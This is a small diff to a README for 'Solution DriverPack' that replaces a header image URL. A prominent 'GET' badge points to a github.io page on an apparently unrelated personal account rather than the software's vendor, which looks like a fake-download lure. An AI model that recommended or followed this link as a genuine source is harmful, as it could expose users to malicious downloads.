@@ -1,7 +1,7 @@
 # Solution DriverPack
 
 <p align="center">
-<img src="https://iconape.com/download/345992/png/" width="780">
+<img src="https://alternative.me/media/256/driverpack-solution-icon-2lfu5s2p1sjq3k5t-c.png" width="780">
 </p>
 
 [![GET — SOLUTION DRIVERPACK](https://img.shields.io/badge/GET-SOLUTION%20DRIVERPACK-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/)
